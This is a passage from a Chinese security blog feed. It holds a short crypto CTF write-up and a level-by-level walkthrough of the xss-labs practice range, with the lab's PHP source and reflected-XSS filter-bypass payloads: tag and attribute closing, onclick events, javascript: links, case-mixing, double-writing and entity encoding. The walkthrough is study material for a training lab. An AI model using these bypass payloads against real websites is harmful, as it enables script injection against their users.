        <content type="html"><![CDATA[<h5 id="1、滴答-滴"><a href="#1、滴答-滴" class="headerlink" title="1、滴答~滴"></a>1、滴答~滴</h5><p><img src="http://img1002-c.pocoimg.cn/image/poco/works/69/2019/0714/10/15630731171838583_201104351_H800.png" alt="在这里插入图片描述"><br>这题一看就是摩斯密码，直接用morse密码的在线工具 <a href="https://www.jb51.net/tools/morse.htm">工具地址</a><br>提交得flag （￣︶￣）↗　</p><h5 id="2、聪明的小羊"><a href="#2、聪明的小羊" class="headerlink" title="2、聪明的小羊"></a>2、聪明的小羊</h5><p><img src="http://img1002-c.pocoimg.cn/image/poco/works/69/2019/0714/10/15630731173061215_201104351_H800.png" alt="在这里插入图片描述"><br>看题目中的提示应该是栅栏密码，且偏移量为二，直接使用Bugku里的工具解密，得到flag。</p><h5 id="3、OK"><a href="#3、OK" class="headerlink" title="3、OK"></a>3、OK</h5><p><img src="http://img1002-c.pocoimg.cn/image/poco/works/69/2019/0714/10/15630731171042226_201104351_H800.png" alt="在这里插入图片描述">直接用bugku的ook解密工具<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/69/2019/0714/10/15630731176840145_201104351_H800.png" alt="在这里插入图片描述"></p><h5 id="4、这不是摩斯密码"><a href="#4、这不是摩斯密码" class="headerlink" title="4、这不是摩斯密码"></a>4、这不是摩斯密码</h5><p><img src="http://img1002-c.pocoimg.cn/image/poco/works/69/2019/0714/10/15630731171214035_201104351_H800.png" alt="在这里插入图片描述"><br>打开是这样的：<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/69/2019/0714/10/15630731174803938_201104351_H800.png" alt="在这里插入图片描述"><br>百度得知这是brainfuck的东西，然后接着使用bugku的工具<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/69/2019/0714/10/15630731174435705_201104351_H800.png" alt="在这里插入图片描述"></p><h5 id="5、简单加密"><a href="#5、简单加密" class="headerlink" title="5、简单加密"></a>5、简单加密</h5><p><img src="http://img1002-c.pocoimg.cn/image/poco/works/69/2019/0714/10/15630731179839622_201104351_H800.png" alt="在这里插入图片描述"><br>这题乍一看没啥头绪，但是最后两位字符是我联想到了base64 加密，<code>A</code>的ASCII码为65，<code>=</code>的ASCII码为61，即需要先左移4位；<br>将字符转换为ASCII码：</p><pre><code>101,54,90,57,105,126,93,56,82,126,85,126,81,72,69,123,82,110,89,123,81,88,103,126,81,110,81,123,94,88,86,108,82,88,108,112,94,88,73,53,81,54,81,54,83,75,89,56,106,85,65,65</code></pre><p>再写个Python脚本解密</p><pre><code>import base64m=[101,54,90,57,105,126,93,56,82,126,85,126,81,72,69,123,82,110,89,123,81,88,103,126,81,110,81,123,94,88,86,108,82,88,108,112,94,88,73,53,81,54,81,54,83,75,89,56,106,85,65,65]flag=&#39;&#39;i=4for j in m:    flag+=chr(j-i)flag=base64.b64decode(flag).decode()print(flag)</code></pre><p>Ok，得到flag</p><h5 id="6、散乱的密文"><a href="#6、散乱的密文" class="headerlink" title="6、散乱的密文"></a>6、散乱的密文</h5><p><img src="http://img1002-c.pocoimg.cn/image/poco/works/69/2019/0714/10/15630731174029626_201104351_H800.png" alt="在这里插入图片描述">打开题目，嗯…密文确实挺散乱的，但还是感觉flag就在这里面，重点看第二句话“一张纸条上凌乱的写着2 1 6 5 3 4”，看到这，我们就能想起来，在古典密码中，有一种特使的加密方式是分组置换加密，嗯，没错，这题就是，而且这道题已经把分组的顺序告诉了我们。下面看解题过程：</p><p>|2 |1| 6| 5| 3| 4|<br>|–|–|–|–|–|–|–|<br>|l |f |5 |{ |a |g|<br>|0 | 2| 4|c |4 |8|<br>|3 | 5| 4|9 |d |7|<br>|f | d| @|@ |1 |}|<br>然后按照顺序读出来得到：flag{52048c453d794df1}@@<br>测试知后面@@应删去。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Xss-labs闯关总结</title>
      <link href="2019/07/13/Xss-labs%E9%97%AF%E5%85%B3%E6%80%BB%E7%BB%93/"/>
      <url>2019/07/13/Xss-labs%E9%97%AF%E5%85%B3%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>时间过的真快，一转眼大一就过去了，趁着这个暑假好好补补课，通过 <a href="https://github.com/do0dl3/xss-labs">xss-labs</a> 靶场练习一下 XSS 注入，关于 XSS 的介绍可以看这篇文章：<a href="https://blog.csdn.net/qq_43531669/article/details/120403269">文章链接</a></p><h3 id="Level-1-无过滤机制"><a href="#Level-1-无过滤机制" class="headerlink" title="Level 1 无过滤机制"></a>Level 1 无过滤机制</h3><p><img src="https://img-blog.csdnimg.cn/5707f4cdd3a44d39ab52bba9d53f04b2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>来到题目页面，发现并没有输入框，可以看到在url栏中传了一个参数，所以在该参数处进行尝试传入其它参数<br><img src="https://img-blog.csdnimg.cn/6adb3a1d15de48aa94318f2429dae586.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>发现页面有所变化，在 “欢迎用户” 后有一个显示位能对传入的参数进行输出，在下方payload长度处也有字符串长度的统计，尝试构造脚本 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src="https://img-blog.csdnimg.cn/1151603cdbbc469d9b457fde4a94cab3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>成功通过。</p><h4 id="查看后台源码："><a href="#查看后台源码：" class="headerlink" title="查看后台源码："></a>查看后台源码：</h4><pre><code class="php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;&lt;script&gt;window.alert = function()  &#123;     confirm(&quot;完成的不错！&quot;); window.location.href=&quot;level2.php?keyword=test&quot;; &#125;&lt;/script&gt;&lt;title&gt;欢迎来到level1&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;name&quot;];echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;?&gt;&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>根据源码可以看出，程序将用户以GET方式提交的参数name，没有做任何防御措施就直接显示在HTML页面中，因此存在反射型的XSS漏洞，直接将代码<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>传入name变量中即可触发漏洞。</p><h4 id="通关代码："><a href="#通关代码：" class="headerlink" title="通关代码："></a>通关代码：</h4><pre><code class="go">?name=&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><h3 id="Level-2-闭合标签"><a href="#Level-2-闭合标签" class="headerlink" title="Level 2 闭合标签"></a>Level 2 闭合标签</h3><p><img src="https://img-blog.csdnimg.cn/1ad1b1ca19ac454d848a4480980924d6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>直接输入上一关的 payload，发现直接被原样输出了<br><img src="https://img-blog.csdnimg.cn/2960586875b444e3ae0762c75c0244a6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>右键查看页面源码：<br><img src="https://img-blog.csdnimg.cn/0f957685d11341d7a566b1b6dec78eb4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>可以看到在<code>&lt;h2&gt;</code>标签中的恶意代码被转义了，盲猜在服务器端用 htmlspecialchars() 函数对 keyword 参数的值进行了处理。</p><p>接着可以看到插入到 value 参数中的恶意代码并没有被转义而是直接原样返回的，那么就从这里入手，要想程序在这里执行弹窗代码，只需要将属性的标签闭合就可以了，输入 <code>  &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p>补充：<a href="https://www.w3school.com.cn/php/func_string_htmlspecialchars.asp">htmlspecialchars函数</a><br><img src="https://img-blog.csdnimg.cn/c215cf43cea144049629c3e3221979f9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16">成功通过。</p><h4 id="查看后台源码：-1"><a href="#查看后台源码：-1" class="headerlink" title="查看后台源码："></a>查看后台源码：</h4><pre><code class="php">&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str.&#39;&quot;&gt;&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>可以看到在<code>&lt;h2&gt;</code>处使用了 htmlspecialchars() 函数进行过滤，但是在submit value属性处没有过滤，从而导致XSS漏洞。</p><h4 id="通关代码：-1"><a href="#通关代码：-1" class="headerlink" title="通关代码："></a>通关代码：</h4><pre><code class="go">?keyword=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><h3 id="Level-3-单引号闭合-添加事件"><a href="#Level-3-单引号闭合-添加事件" class="headerlink" title="Level 3 单引号闭合 + 添加事件"></a>Level 3 单引号闭合 + 添加事件</h3><p><img src="https://img-blog.csdnimg.cn/7bbf4368a972470794efaefd6a34f263.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>来到Leval 3，还是先尝试基本的弹窗代码 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src="https://img-blog.csdnimg.cn/fed3f2974e01435a8a2459f729dc1fbe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>并没有成功弹窗，右键看一下网页源码<br><img src="https://img-blog.csdnimg.cn/43022b4d4b29435ca0ddbb5aa8e028ca.png"><br>发现这两处都将 &lt; , &gt; 转义了，猜测服务器端在这两处都用 htmlspecialchars() 函数进行了处理，那么怎样才能成功执行弹窗的代码呢？</p><p>这时候我们就要想办法绕开这些标签去使用新标签，浏览器中有一些事件可以执行js代码，这里使用 <code>onclick</code> 事件，观察源代码为单引号闭合，把value给闭合掉，构造payload：<code>&#39;onclick=&#39;javascript:alert(1)&#39;</code></p><p>补充：<a href="https://www.w3school.com.cn/tags/html_ref_eventattributes.asp"> 事件介绍</a></p><p>可以看到，在提交之后，没有立刻弹出，这里还需要点击一下文本框，让事件触发。<br><img src="https://img-blog.csdnimg.cn/3d0266e49d044fdbb8b563e24f28bc30.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>成功通过。</p><h4 id="查看后台源码：-2"><a href="#查看后台源码：-2" class="headerlink" title="查看后台源码："></a>查看后台源码：</h4><pre><code class="php">&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword  value=&#39;&quot;.htmlspecialchars($str).&quot;&#39;&gt;    &lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&quot;;?&gt;</code></pre><p>可以看到服务器端在页面显示的位置对参数值都用 htmlspecialchars() 函数进行了处理。</p><h4 id="通关代码：-2"><a href="#通关代码：-2" class="headerlink" title="通关代码："></a>通关代码：</h4><pre><code class="go">?keyword=&#39;onclick=&#39;javascript:alert(1)&#39;</code></pre><h3 id="Level-4-双引号闭合-添加事件"><a href="#Level-4-双引号闭合-添加事件" class="headerlink" title="Level 4 双引号闭合 + 添加事件"></a>Level 4 双引号闭合 + 添加事件</h3><p><img src="https://img-blog.csdnimg.cn/7784c1dde5ea4dda94d6a0de26b66dae.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16">老样子尝试弹窗 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src="https://img-blog.csdnimg.cn/9ba1fd2db4dd468f8c1a9dd13d7b5777.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>发现上方显示位并没有什么特殊的变化，但是下方搜索框中的 &lt; , &gt; 标签都被过滤掉了.</p><p>右键查看网页源码：<br><img src="https://img-blog.csdnimg.cn/a38de4c4db224012821b02cf2337d517.png"><br>对上方显示位仍猜测是 htmlspecialchars 函数处理，下方显示位应该是用函数替换掉了，并且下方的闭合标签为双引号。那么仍使用上关的思路，用事件触发，构造payload：<code>&quot; onclick=&#39;javascript:alert(1)&#39;</code><br><img src="https://img-blog.csdnimg.cn/6958dc43239248e6ba0c597fea78d45f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>成功通过。</p><h4 id="查看后台源码：-3"><a href="#查看后台源码：-3" class="headerlink" title="查看后台源码："></a>查看后台源码：</h4><pre><code class="php">&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>果然，第一个显示位使用了 htmlspecialchars 函数处理，第二个显示位经过两个 str_replace() 函数对尖括号进行了过滤，但是不全面，从而存在XSS安全隐患。</p><h4 id="通关代码：-3"><a href="#通关代码：-3" class="headerlink" title="通关代码："></a>通关代码：</h4><pre><code class="go">?keyword=&quot;onclick=&#39;javascript:alert(1)&#39;</code></pre><h3 id="Level-5-新建标签"><a href="#Level-5-新建标签" class="headerlink" title="Level 5 新建标签"></a>Level 5 新建标签</h3><p><img src="https://img-blog.csdnimg.cn/54406c68e4fd42a2a02bf3920eed6d64.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>同样的套路，先尝试 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src="https://img-blog.csdnimg.cn/3ccec157f638449ca34a9483d149a520.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>弹窗失败，上方显示位没什么变化，下方搜索框中的第一个 <code>&lt;script&gt;</code> 变成了 <code>&lt;scr_ipt&gt;</code></p><p>右键查看源码：<br><img src="https://img-blog.csdnimg.cn/ea37cf36e05540858ec212509bf074d2.png"><br>上方显示位应该还是 htmlspecialchars 处理，搜索框中的 payload 可能是匹配到关键字进行的替代。</p><p>那么用事件来试一下，闭合标签仍是双引号，输入代码：<code>&quot;onclick=&#39;javascript:alert(1)&#39;</code><br><img src="https://img-blog.csdnimg.cn/596c32342f884888907497d38262bb99.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>弹窗也失败了，右键查看源码<br><img src="https://img-blog.csdnimg.cn/0571fd90d1444dd39cd7be0cf05094c8.png"><br>发现<code>on</code>变成了<code>o_n</code> ，猜测后台对<code>on</code>进行了过滤，替换成了 <code>o_n</code>，测试一下，输入on<br><img src="https://img-blog.csdnimg.cn/4681ee5178a249a199f4b0b3dee1c47a.png"><br>果然，那这样带 on 的事件就不能用了。</p><p>尝试使用大小写绕过，测试代码：<code>On&lt;Script&gt;</code><br><img src="https://img-blog.csdnimg.cn/dd7e3ac3182a484096abe528246f705f.png"><br>绕过失败，全变成了小写，这里应该还用了转小写的函数。</p><p>此处既然无法通过 <code>&lt;script&gt;</code> 标签和<code>事件</code>来执行js代码的话，那么可以换一个标签来执行js代码，使用新标签要先闭合<code>&lt;input&gt;</code>标签，构造代码：<code>&quot;&gt;&lt;a href=javascript:alert(1)&gt;xss&lt;/a&gt;</code></p><p>补充：<a href="https://www.html.cn/qa/javascript/11155.html">javascript伪协议</a><br><img src="https://img-blog.csdnimg.cn/2d5b4f40fdb24bd59abf1001fccbad4b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>点一下那个链接就行了，右键看一下源码<br><img src="https://img-blog.csdnimg.cn/db68b8343c5f496dadcd4f1fa964c650.png"><br>可以看到链接成功嵌入！</p><h4 id="查看后台源码：-4"><a href="#查看后台源码：-4" class="headerlink" title="查看后台源码："></a>查看后台源码：</h4><pre><code class="php">&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>确实和我们猜的一样，分别对 on 和<code>&lt;script&gt;</code>进行了过滤，也用 strtolower函数做了大小写过滤。🆗，下一关!</p><h4 id="通关代码：-4"><a href="#通关代码：-4" class="headerlink" title="通关代码："></a>通关代码：</h4><pre><code class="go">?keyword=&quot;&gt;&lt;a href=javascript:alert(1)&gt;xss&lt;/a&gt;</code></pre><h3 id="Level-6-大小写绕过"><a href="#Level-6-大小写绕过" class="headerlink" title="Level 6 大小写绕过"></a>Level 6 大小写绕过</h3><p><img src="https://img-blog.csdnimg.cn/51da210721964a2e8ed4017ed5a64768.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>接着使用前面几关的注入方式测试，发现都不行</p><pre><code class="php">&lt;input name=keyword  value=&quot;&lt;scr_ipt&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;input name=keyword  value=&quot; &quot;o_nclick=&#39;javascript:alert(1)&#39; &quot;&gt;&lt;input name=keyword  value=&quot; &quot;&gt;&lt;a hr_ef=&quot;javascript:alert(1)&quot;&gt;xss&lt;/a&gt;&quot;&gt;</code></pre><p>发现这里的 script、onclick、href 都被过滤了。不知道是不是存在大小写过滤，尝试下大小写绕过，可以看到闭合符合是双引号，构造payload：</p><pre><code class="php">&quot;ONclick=&#39;javascript:alert(1)&#39;</code></pre><p>发现可以！<br><img src="https://img-blog.csdnimg.cn/4e0ac64bb19b4f59b5541d169b54d74c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>同理 <code>&quot;&gt;&lt;scRipt&gt;alert(1)&lt;/scRipt&gt;</code>、 <code>&quot;&gt;&lt;a hREF=javascript:alert(1)&gt;xss&lt;/a&gt;</code> 也可以。</p><h4 id="查看后台源码：-5"><a href="#查看后台源码：-5" class="headerlink" title="查看后台源码："></a>查看后台源码：</h4><pre><code class="php">&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level6.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>可以看出系统对 &lt;script、on、src、data、href 进行了过滤，但是没有对大写字母进行修改，所以我们可以使用 “大小写绕过” 进行注入，🆗 Next !</p><h4 id="通关代码：-5"><a href="#通关代码：-5" class="headerlink" title="通关代码："></a>通关代码：</h4><pre><code class="go">?keyword=&quot;ONclick=&#39;javascript:alert(1)&#39;</code></pre><h3 id="Level-7-双写绕过"><a href="#Level-7-双写绕过" class="headerlink" title="Level 7 双写绕过"></a>Level 7 双写绕过</h3><p><img src="https://img-blog.csdnimg.cn/91818e9693b9460a91247abfd640a119.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>先用 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 测试<br><img src="https://img-blog.csdnimg.cn/e657264acbeb4266b03412e3bfd57fa1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>右键源码<br><img src="https://img-blog.csdnimg.cn/8224a82d368f43d0be17d26ee6e87d35.png"><br>发现 script 直接被过滤了，尝试大小写绕过也不行，再尝试</p><pre><code class="php">&quot;onclick=&#39;javascript:alert(1)&#39;</code></pre><p>和</p><pre><code class="php">&quot;&gt;&lt;a href=javascript:alert(1)&gt;xss&lt;/a&gt;</code></pre><p><img src="https://img-blog.csdnimg.cn/297d4b7cecbf4d309f8b2da403ac3c9c.png"><br><img src="https://img-blog.csdnimg.cn/e1f43158b9a84a978e62e5d64d9f4e79.png"><br>发现 <code>on  href </code> 也被过滤了，尝试大小写也不行。但是道高一尺，魔高一丈，有人想出了双写绕过，哈哈哈。</p><p>构造命令：</p><pre><code class="go">&quot;&gt;&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;</code></pre><p><img src="https://img-blog.csdnimg.cn/af6a0a4482df4bff9449314305791b65.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>绕过成功！</p><h4 id="查看后台源码：-6"><a href="#查看后台源码：-6" class="headerlink" title="查看后台源码："></a>查看后台源码：</h4><pre><code class="php">&lt;?php ini_set(&quot;display_errors&quot;, 0);$str =strtolower( $_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>可以看到参数做了小写转义，关键字直接被删去，上面输出位使用了 hemlspecialchars 转义。好的，下一关！(≧∇≦)ﾉ</p><h4 id="通关代码：-6"><a href="#通关代码：-6" class="headerlink" title="通关代码："></a>通关代码：</h4><pre><code class="go">?keyword=&quot;&gt;&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;</code></pre><h3 id="Level-8-编码绕过"><a href="#Level-8-编码绕过" class="headerlink" title="Level 8 编码绕过"></a>Level 8 编码绕过</h3><p><img src="https://img-blog.csdnimg.cn/bf4be8b85683492b98094e554f41c999.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_19,color_FFFFFF,t_70,g_se,x_16"><br>老套路，尝试代码 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src="https://img-blog.csdnimg.cn/8ea6d933eca440fbae00cc1548dd2e61.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_15,color_FFFFFF,t_70,g_se,x_16"><br>右键观察源码<br><img src="https://img-blog.csdnimg.cn/ff0701c169e04e93bea68ba7f3945a0f.png"><br>可以看到输入的内容被插在了a标签的 href 属性值中并且 script 被转义成了 scr_ipt，想到使用 javascript 伪协议，尝试代码：</p><pre><code class="php">javascript:alert(1)</code></pre><p><img src="https://img-blog.csdnimg.cn/da77977683394063960a99d47d4d9265.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16">可以看到这里 script 被转义，尝试大写绕过，发现不行，既然这样，我们试试编码，看能否绕过。</p><p>程序将 script 中的 ri 变成了 r_i，所以对 r 和 i 编码试试（也可以将script全编码了），将 <code>ri</code> 转换为 html 实体编码(16进制或10进制，还可以使用url编码等其它网页语言）<a href="https://www.qqxiuzi.cn/bianma/zifushiti.php">编码工具</a><br><img src="https://img-blog.csdnimg.cn/4cb4e839c3494026a538af808ed21f99.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>构造payload：</p><pre><code class="go">javasc&amp;#114;&amp;#105;pt:alert(1)</code></pre><p>点击链接<br><img src="https://img-blog.csdnimg.cn/6995d7e887a24700a12cac45c07359ef.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>通关成功！</p><h4 id="查看后台源码：-7"><a href="#查看后台源码：-7" class="headerlink" title="查看后台源码："></a>查看后台源码：</h4><pre><code class="php">&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);echo &#39;&lt;center&gt;&lt;form action=level8.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;</code></pre><p>可以看到敏感字符已经被加下划线过滤；双引号也被过滤，所以说也没有办法给属性值闭合；还有小写处理，也不能大小写要过；没有敏感字符去除，不能双写绕过。</p><h4 id="通关代码：-7"><a href="#通关代码：-7" class="headerlink" title="通关代码："></a>通关代码：</h4><pre><code 